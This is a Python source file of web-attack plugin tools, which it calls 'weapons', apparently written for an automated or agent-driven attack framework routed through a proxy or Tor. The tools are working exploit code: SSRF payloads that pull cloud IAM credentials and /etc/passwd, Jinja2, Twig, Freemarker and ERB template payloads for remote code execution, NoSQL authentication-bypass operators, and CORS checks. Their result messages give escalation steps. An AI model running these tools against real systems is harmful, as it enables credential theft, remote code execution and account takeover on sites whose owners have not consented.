"""Advanced web-attack weapons - the classes beyond the common SQLi/IDOR/XSS set:
server-side request forgery, CORS misconfiguration, server-side template injection
(engine-fingerprinted, with the RCE escalation), and NoSQL injection.

Each tool shares the authenticated web session (one cookie jar) and the active egress
(proxy/Tor) with the other web tools, so it operates as the logged-in user and stays
in-channel. They are evidence-first: a finding is a concrete signal in a response the
tool actually elicited (leaked internal content, a reflected arbitrary Origin, a
rendered arithmetic result), not a guess.
"""

from __future__ import annotations

import json
import re
import time
import urllib.parse
from typing import Any, Optional

from browser.http_client import HttpClient
from browser.scraping_tools import WebSession
from plugins.sdk.base_tool import BaseTool, Permission, ToolResult

_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
       "(KHTML, like Gecko) Chrome/124.0 Safari/537.36")


class _WebToolBase(BaseTool):
    """Shared plumbing: egress proxy + the persistent cookie jar."""

    name = "_web_advanced_base"  # placeholder; each concrete tool overrides it
    description = "advanced web-attack tool"
    parameters = {"type": "object", "properties": {}}

    def __init__(self, egress: Any = None, session: "Optional[WebSession]" = None,
                 **kwargs: Any) -> None:
        super().__init__(**kwargs)
        self.egress = egress
        self.session = session or WebSession()

    def _proxy(self) -> Any:
        return self.egress.httpx_proxy() if self.egress is not None else None

    def _client(self, timeout: float = 15.0) -> HttpClient:
        return HttpClient(timeout=timeout, proxy=self._proxy(),
                          cookies=getattr(self.session, "cookies", None),
                          headers={"User-Agent": _UA}, verify_ssl=False)

    @staticmethod
    def _inject(url: str, param: Optional[str], value: str) -> str:
        """Return `url` with `param` set to `value` (added if absent). With no param,
        the whole query value / a {PAYLOAD} marker is replaced."""
        if not param:
            if "{PAYLOAD}" in url:
                return url.replace("{PAYLOAD}", urllib.parse.quote(value, safe=""))
            return url
        parts = urllib.parse.urlsplit(url)
        q = dict(urllib.parse.parse_qsl(parts.query, keep_blank_values=True))
        q[param] = value
        return urllib.parse.urlunsplit(
            (parts.scheme, parts.netloc, parts.path,
             urllib.parse.urlencode(q), parts.fragment))


# --------------------------------------------------------------------------- #
# SSRF
# --------------------------------------------------------------------------- #

class SsrfProbeTool(_WebToolBase):
    """Probe a URL/parameter for Server-Side Request Forgery: make the server fetch
    internal targets (cloud metadata, loopback, alternate-encoded internal IPs, and
    file/gopher/dict schemes) and detect a leak of internal-only content. SSRF is the
    classic pivot to cloud-credential theft (IMDS) and internal service access."""

    name = "ssrf_probe"
    description = (
        "Test a URL parameter for SSRF by making the server fetch internal targets and "
        "detecting leaked internal content: cloud metadata (AWS/GCP/Azure IMDS - the "
        "path to instance IAM credentials), loopback + alternate-encoded internal IPs "
        "(127.0.0.1, 0177.0.0.1, 2130706433, [::1], 0.0.0.0), and file:// / gopher:// / "
        "dict:// schemes. Give the `url` and the `param` whose value is fetched "
        "server-side (e.g. url, uri, image, callback, webhook, next). Reports the "
        "payload that leaked internal data - a confirmed SSRF."
    )
    parameters = {
        "type": "object",
        "properties": {
            "url": {"type": "string", "description": "The endpoint, e.g. https://t/fetch?url=x"},
            "param": {"type": "string",
                      "description": "The server-fetched parameter (url/uri/image/callback/...)."},
        },
        "required": ["url", "param"],
    }
    permissions = {Permission.NETWORK}
    timeout = 45
    tags = ["web", "ssrf", "exploit"]

    # (label, payload, extra-headers, signature-regex proving an internal fetch)
    _PAYLOADS = [
        ("aws-imds-creds", "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
         {}, r"(?i)AccessKeyId|SecretAccessKey|Token|<role>|\b[A-Za-z0-9_-]{20,}"),
        ("aws-imds", "http://169.254.169.254/latest/meta-data/", {},
         r"(?i)ami-id|instance-id|hostname|iam|public-keys|security-credentials"),
        ("gcp-metadata", "http://metadata.google.internal/computeMetadata/v1/instance/",
         {"Metadata-Flavor": "Google"}, r"(?i)computeMetadata|service-accounts|numeric-project-id"),
        ("azure-imds", "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
         {"Metadata": "true"}, r"(?i)compute|azEnvironment|subscriptionId|vmId"),
        ("loopback-decimal", "http://2130706433/", {}, r"(?i)<html|server:|apache|nginx|root:x:"),
        ("loopback-octal", "http://0177.0.0.1/", {}, r"(?i)<html|server:|apache|nginx|root:x:"),
        ("loopback-ipv6", "http://[::1]/", {}, r"(?i)<html|server:|apache|nginx"),
        ("file-passwd", "file:///etc/passwd", {}, r"root:x:0:0:"),
        ("dict-redis", "dict://127.0.0.1:6379/info", {}, r"(?i)redis_version|used_memory|connected_clients"),
        ("gopher-localhost", "gopher://127.0.0.1:80/_GET / HTTP/1.0", {}, r"(?i)<html|server:"),
    ]

    async def execute(self, url: str, param: str, **kwargs: Any) -> ToolResult:
        url = (url or "").strip()
        param = (param or "").strip()
        if not url:
            return ToolResult.fail("ssrf_probe: 'url' is required")
        hits: list[str] = []
        tried = 0
        try:
            async with self._client(timeout=12.0) as client:
                # Baseline so we can tell a real internal leak from the app's own body.
                base = await client.get(self._inject(url, param, "http://example.com/"),
                                        extra_headers={"User-Agent": _UA})
                base_body = (base.text or "")[:4000]
                for label, payload, hdrs, sig in self._PAYLOADS:
                    tried += 1
                    target = self._inject(url, param, payload)
                    resp = await client.get(target, extra_headers={**hdrs, "User-Agent": _UA})
                    body = resp.text or ""
                    m = re.search(sig, body)
                    if m and m.group(0) not in base_body:
                        snippet = body[max(0, m.start() - 20):m.start() + 120].strip()
                        hits.append(f"  [{label}] payload={payload!r} status={resp.status_code}\n"
                                    f"    leaked: …{snippet}…")
        except Exception as exc:
            if not hits:
                return ToolResult.fail(f"ssrf_probe: request failed - {exc}")

        if not hits:
            return ToolResult.ok(
                f"ssrf_probe: no SSRF signal on {param!r} of {url} ({tried} payloads). The "
                "param may not be fetched server-side, or egress is filtered. Try another "
                "param (uri/image/callback/webhook/next) or a blind-SSRF collaborator.",
                metadata={"param": param, "hits": 0})
        return ToolResult.ok(
            "ssrf_probe: SSRF CONFIRMED - the server fetched an internal target and "
            f"leaked its content ({param!r} on {url}):\n" + "\n".join(hits) +
            "\n\nEscalate: for AWS, read /latest/meta-data/iam/security-credentials/<role> "
            "for temporary keys; for internal services, pivot with gopher:// (e.g. Redis).",
            metadata={"param": param, "hits": len(hits)})


# --------------------------------------------------------------------------- #
# CORS
# --------------------------------------------------------------------------- #

class CorsAuditTool(_WebToolBase):
    """Audit a URL's CORS policy for misconfigurations that let an attacker's page read
    authenticated responses cross-origin: a reflected arbitrary Origin, `null` origin
    trust, or unsafe subdomain/prefix/suffix matching - especially with
    Access-Control-Allow-Credentials: true."""

    name = "cors_audit"
    description = (
        "Audit a URL's CORS policy for exploitable misconfigurations. Sends crafted "
        "Origin headers (arbitrary attacker origin, null, a target subdomain, and "
        "prefix/suffix bypasses) and inspects Access-Control-Allow-Origin/-Credentials. "
        "Flags the critical case - the response reflects an arbitrary Origin AND allows "
        "credentials, so a malicious page can read the victim's authenticated data."
    )
    parameters = {
        "type": "object",
        "properties": {
            "url": {"type": "string", "description": "The endpoint to test (an authenticated API URL is best)."},
        },
        "required": ["url"],
    }
    permissions = {Permission.NETWORK}
    timeout = 25
    tags = ["web", "cors", "misconfig"]

    def _origins(self, url: str) -> list[tuple[str, str]]:
        host = urllib.parse.urlsplit(url).netloc or "target"
        base = host.split(":")[0]
        return [
            ("arbitrary", "https://evil.example"),
            ("null", "null"),
            ("subdomain", f"https://evil.{base}"),
            ("suffix", f"https://{base}.evil.example"),
            ("prefix", f"https://{base}evil.example"),
            ("scheme-downgrade", f"http://{base}"),
        ]

    async def execute(self, url: str, **kwargs: Any) -> ToolResult:
        url = (url or "").strip()
        if not url:
            return ToolResult.fail("cors_audit: 'url' is required")
        rows: list[str] = []
        critical: list[str] = []
        try:
            async with self._client() as client:
                for label, origin in self._origins(url):
                    resp = await client.get(url, extra_headers={"Origin": origin,
                                                                "User-Agent": _UA})
                    h = {k.lower(): v for k, v in (resp.headers or {}).items()}
                    acao = h.get("access-control-allow-origin", "")
                    acac = h.get("access-control-allow-credentials", "").lower() == "true"
                    reflected = acao == origin or (origin == "null" and acao == "null")
                    verdict = ""
                    if reflected and acac:
                        verdict = "  <-- CRITICAL: reflects this origin AND allows credentials"
                        critical.append(f"{label} ({origin})")
                    elif reflected:
                        verdict = "  <-- reflected origin (no creds; still a leak if data is unauthenticated)"
                    elif acao == "*" and acac:
                        verdict = "  <-- wildcard + credentials (invalid but some stacks honor it)"
                    rows.append(f"  Origin: {origin:32} -> ACAO={acao or '(none)'} "
                                f"ACAC={acac}{verdict}")
        except Exception as exc:
            return ToolResult.fail(f"cors_audit: request failed - {exc}")

        header = f"cors_audit - {url}\n" + "\n".join(rows)
        if critical:
            return ToolResult.ok(
                header + "\n\nCORS MISCONFIGURATION CONFIRMED (" + ", ".join(critical) +
                "): host a page on the accepted origin that fetches this URL with "
                "credentials:'include' and exfiltrates the response - it reads the "
                "victim's authenticated data cross-origin.",
                metadata={"url": url, "critical": len(critical)})
        return ToolResult.ok(header + "\n\nNo exploitable CORS misconfiguration found.",
                             metadata={"url": url, "critical": 0})


# --------------------------------------------------------------------------- #
# SSTI
# --------------------------------------------------------------------------- #

class SstiProbeTool(_WebToolBase):
    """Probe a parameter for Server-Side Template Injection, fingerprint the template
    engine from how it evaluates a polyglot, and hand back the engine-specific RCE
    payload. SSTI in a server-rendered template is a direct path to remote code
    execution."""

    name = "ssti_probe"
    description = (
        "Test a parameter for Server-Side Template Injection and fingerprint the engine. "
        "Sends arithmetic polyglots ({{7*7}}, ${7*7}, <%= 7*7 %>, #{7*7}, {{7*'7'}}) and "
        "detects a rendered result (49, or 7777777 for Jinja/Twig string-multiply), then "
        "returns the engine-specific RCE escalation (Jinja2/Twig/Freemarker/ERB/Velocity). "
        "Give `url`, the `param`, and for POST bodies set method/body."
    )
    parameters = {
        "type": "object",
        "properties": {
            "url": {"type": "string", "description": "The endpoint."},
            "param": {"type": "string", "description": "The parameter to inject."},
            "method": {"type": "string", "enum": ["GET", "POST"], "default": "GET"},
        },
        "required": ["url", "param"],
    }
    permissions = {Permission.NETWORK}
    timeout = 30
    tags = ["web", "ssti", "rce"]

    # (payload, marker-in-response, engine, rce)
    _PROBES = [
        ("{{7*'7'}}", "7777777", "Jinja2/Twig (Python/PHP)",
         "{{cycler.__init__.__globals__.os.popen('id').read()}}  (Jinja2) | "
         "{{['id']|filter('system')}}  (Twig)"),
        ("${7*7}", "49", "Freemarker/JSP-EL/Velocity",
         "${\"freemarker.template.utility.Execute\"?new()(\"id\")}  (Freemarker) | "
         "#set($e=$rt.exec('id'))  (Velocity)"),
        ("<%= 7*7 %>", "49", "ERB (Ruby)", "<%= `id` %>  or  <%= system('id') %>"),
        ("#{7*7}", "49", "Ruby #{} / Slim / Pug", "#{`id`}  or  #{system('id')}"),
        ("{{7*7}}", "49", "Jinja2/Twig/Angular", "see Jinja2/Twig RCE above"),
        ("${{7*7}}", "49", "smarty/other ${{}}", "engine-specific; confirm then escalate"),
    ]

    async def execute(self, url: str, param: str, method: str = "GET",
                      **kwargs: Any) -> ToolResult:
        url = (url or "").strip()
        param = (param or "").strip()
        if not url or not param:
            return ToolResult.fail("ssti_probe: 'url' and 'param' are required")
        method = (method or "GET").upper()
        findings: list[str] = []
        try:
            async with self._client() as client:
                for payload, marker, engine, rce in self._PROBES:
                    if method == "POST":
                        resp = await client.post(url, data={param: payload},
                                                 extra_headers={"User-Agent": _UA})
                    else:
                        resp = await client.get(self._inject(url, param, payload),
                                                extra_headers={"User-Agent": _UA})
                    if marker in (resp.text or ""):
                        findings.append(
                            f"  payload {payload!r} rendered {marker!r} -> engine: {engine}\n"
                            f"    RCE: {rce}")
                        break  # one confirmed engine is enough to escalate
        except Exception as exc:
            return ToolResult.fail(f"ssti_probe: request failed - {exc}")

        if not findings:
            return ToolResult.ok(
                f"ssti_probe: no SSTI on {param!r} of {url} - the value is not rendered "
                "through a server template (it may be reflected as plain text = XSS "
                "territory, or not reflected at all).",
                metadata={"param": param, "ssti": False})
        return ToolResult.ok(
            "ssti_probe: SSTI CONFIRMED (server evaluated the template expression):\n"
            + "\n".join(findings) +
            "\n\nSend the RCE payload in the same param to run a command; confirm with "
            "`id`/`whoami` in the response before reporting.",
            metadata={"param": param, "ssti": True})


# --------------------------------------------------------------------------- #
# NoSQL injection
# --------------------------------------------------------------------------- #

class NoSqliProbeTool(_WebToolBase):
    """Probe a login/query endpoint for NoSQL (MongoDB-style) injection: operator
    injection ($ne/$gt/$regex) that turns a value comparison into an always-true query -
    the NoSQL auth-bypass and blind-extraction primitive."""

    name = "nosqli_probe"
    description = (
        "Test a JSON or form endpoint for NoSQL (MongoDB) injection. Replaces the target "
        "field(s) with operator objects ({\"$ne\":null}, {\"$gt\":\"\"}, {\"$regex\":\".*\"}) "
        "and the form-encoded equivalents (field[$ne]=x), then diffs the response against "
        "a benign baseline - a changed/authenticated response signals the query was "
        "subverted (classic auth bypass). Give `url`, the `fields` to inject (e.g. "
        "username,password), and `body` as JSON for the baseline; set `form` for "
        "form-encoded bodies."
    )
    parameters = {
        "type": "object",
        "properties": {
            "url": {"type": "string", "description": "The endpoint (usually a login/query POST)."},
            "fields": {"type": "string",
                       "description": "Comma-separated fields to inject, e.g. 'username,password'."},
            "body": {"type": "object",
                     "description": "Baseline request body (benign values), e.g. {\"username\":\"x\",\"password\":\"y\"}."},
            "form": {"type": "boolean",
                     "description": "Send form-encoded instead of JSON (default false = JSON).",
                     "default": False},
        },
        "required": ["url", "fields"],
    }
    permissions = {Permission.NETWORK}
    timeout = 30
    tags = ["web", "nosqli", "exploit"]

    _OPS = [{"$ne": None}, {"$gt": ""}, {"$regex": ".*"}, {"$ne": "x"}]

    @staticmethod
    def _sig(resp: Any) -> tuple[int, int]:
        return (resp.status_code, len((resp.text or "")))

    async def execute(self, url: str, fields: str, body: Optional[dict] = None,
                      form: bool = False, **kwargs: Any) -> ToolResult:
        url = (url or "").strip()
        if not url:
            return ToolResult.fail("nosqli_probe: 'url' is required")
        flds = [f.strip() for f in (fields or "").split(",") if f.strip()]
        if not flds:
            return ToolResult.fail("nosqli_probe: 'fields' is required")
        base_body = dict(body or {f: "test" for f in flds})
        results: list[str] = []
        try:
            async with self._client() as client:
                baseline = await (client.post(url, data=base_body) if form
                                  else client.post(url, json=base_body))
                b_sig = self._sig(baseline)
                # Inject an operator into ALL target fields at once (classic auth bypass).
                for op in self._OPS:
                    if form:
                        data = dict(base_body)
                        for f in flds:
                            # field[$ne]=x style for form bodies
                            key = f + "[" + list(op.keys())[0] + "]"
                            data.pop(f, None)
                            data[key] = str(list(op.values())[0] if list(op.values())[0] is not None else "")
                        resp = await client.post(url, data=data, extra_headers={"User-Agent": _UA})
                    else:
                        payload = dict(base_body)
                        for f in flds:
                            payload[f] = op
                        resp = await client.post(url, json=payload, extra_headers={"User-Agent": _UA})
                    sig = self._sig(resp)
                    changed = sig != b_sig
                    op_s = json.dumps(op)
                    mark = "  <-- response CHANGED vs baseline (likely injectable)" if changed else ""
                    results.append(f"  {op_s:22} -> status={sig[0]} len={sig[1]}{mark}")
        except Exception as exc:
            return ToolResult.fail(f"nosqli_probe: request failed - {exc}")

        hit = any("CHANGED" in r for r in results)
        header = (f"nosqli_probe - {url}  fields={flds}\n"
                  f"  baseline               -> status={b_sig[0]} len={b_sig[1]}\n"
                  + "\n".join(results))
        if hit:
            return ToolResult.ok(
                header + "\n\nLIKELY NoSQL INJECTION: an operator object changed the "
                "query result - a {\"$ne\":null} on both auth fields is the classic "
                "MongoDB auth bypass. Confirm by checking for an authenticated response "
                "(token/redirect/user object), then extract blind with $regex.",
                metadata={"url": url, "injectable": True})
        return ToolResult.ok(
            header + "\n\nNo NoSQL-injection signal (responses matched the baseline). The "
            "backend may not be Mongo-style, or it coerces the operators to strings.",
            metadata={"url": url, "injectable": False})
